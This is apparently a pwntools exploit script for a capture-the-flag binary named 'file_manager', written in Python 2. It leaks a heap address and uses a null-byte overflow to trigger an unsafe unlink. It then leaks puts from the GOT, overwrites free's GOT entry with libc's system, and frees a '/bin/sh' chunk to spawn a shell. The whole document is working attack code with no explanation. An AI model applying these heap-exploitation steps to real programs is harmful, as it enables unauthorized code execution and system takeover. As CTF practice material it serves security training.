from pwn import *
import time,sys,binascii

elf_name = "./file_manager"
elf = ELF(elf_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process('./file_manager')
gdb.attach(io, "b *0x000000000040092E")

def create_file(name, length, content):
    io.recvuntil('=======================\n')
    io.sendline('1')
    io.recvuntil('filename:\n')
    io.send(name)
    io.recvuntil('length:\n')
    io.sendline(str(length))
    io.recvuntil('content:\n')
    io.send(content)

def edit_file(index, content):
    io.recvuntil('=======================\n')
    io.sendline('2')
    io.recvuntil('index:\n')
    io.sendline(str(index))
    io.recvuntil('content:\n')
    io.send(content)

def view_file(index):
    io.recvuntil('=======================\n')
    io.sendline('3')
    io.recvuntil('index:\n')
    io.sendline(str(index))

    '''
    data = io.recv()
    data = io.recvuntil('\n', drop = True)
    #print data
    index = data.split('|')[0]
    file_name = data.split('|')[1]
    file_content = data.split('|')[2]
    '''
    index = io.recvuntil(' | ', drop = True)
    file_name = io.recvuntil(' | ', drop = True)
    file_content = io.recvuntil('\n', drop = True)

    print '[*]index :',index
    print '[*]file_name :',file_name
    print '[*]file_content :',file_content
    print '[16] :',binascii.b2a_hex(file_content)
    return file_content

def delete_file(index):
    io.recvuntil('=======================\n')
    io.sendline('4')
    io.recvuntil('index:\n')
    io.sendline(str(index))

if __name__ == '__main__':
    #pause()
    create_file('file0', 0x100, 'a' * 0x50)
    create_file('file1', 0x100, 'a' * 0x50)
    create_file('file2', 0x100, 'a' * 0x50)
    create_file('file3', 0x100, 'a' * 0x50)
    create_file('file4', 0x100, 'a' * 0x50)
    create_file('file5', 0x100, 'a' * 0x50)
    create_file('file6', 0x100, 'a' * 0x50)

    delete_file(1)
    delete_file(3)
    create_file('file1', 0x100, 'a' * 0x7 + '\x00')
    edit_file(1, 'a' * 8)
    content = view_file(1)
    heap_addr = content.split('a'*0x8)[1]
    heap_addr = heap_addr.split('\n')[0]

    heap_offset = 0x65b3f0 - 0x65b000
    heap_base = u64(heap_addr.ljust(8, '\x00')) - heap_offset
    print '[*]heap base : ' + hex( heap_base)

    create_file('file3', 0x100, 'a' * 0x50)

    create_file('file7', 0x28, 'a' * 0x7 + '\x00')
    delete_file(7)

    create_file('file7', 0xf8, 'a' * 0x50)
    create_file('file8', 0x100, 'a' * 0x50)

    payload = '7' * 0xf8 + p64(0x110)[:2] + '\x00'
    create_file('/bin/sh\n', 0x100, payload)

    delete_file(7)
    create_file('file7', 0xf8, '7' * 0x8)

    #delete_file(7)

    ptr = 0x6025a0 + 7 * 0x10 + 0x8

    payload = p64(0x0) + p64(0xf1) + p64(ptr - 0x18) + p64(ptr - 0x10) + '7' * 0xd0 + p64(0xf0)
    edit_file(7, payload)

    delete_file(8)

    payload = p64(elf.got['puts']) + p64(elf.got['free'])
    edit_file(7, payload)

    io.recvuntil('=======================\n')
    io.sendline('3')
    io.recvuntil('index:\n')
    io.sendline('6')


    index = io.recvuntil(' | ', drop = True)
    puts_addr = io.recvuntil(' | ', drop = True)
    #print 'puts_addr is :',puts_addr,len(puts_addr)
    puts_addr = u64(puts_addr.ljust(8,'\x00'))
    #free_addr = u64(io.recvuntil('\n', drop = True))
    io.recvuntil('\n', drop = True)

    print '[*]puts_addr :', str(hex(puts_addr))
    #print '[*]free_addr :', str(hex(free_addr))

    system_addr = puts_addr - libc.symbols['puts'] + libc.symbols['system']
    print '[*]system_addr :', str(hex(system_addr))

    edit_file(6, p64(system_addr))

    delete_file(9)

    io.interactive()
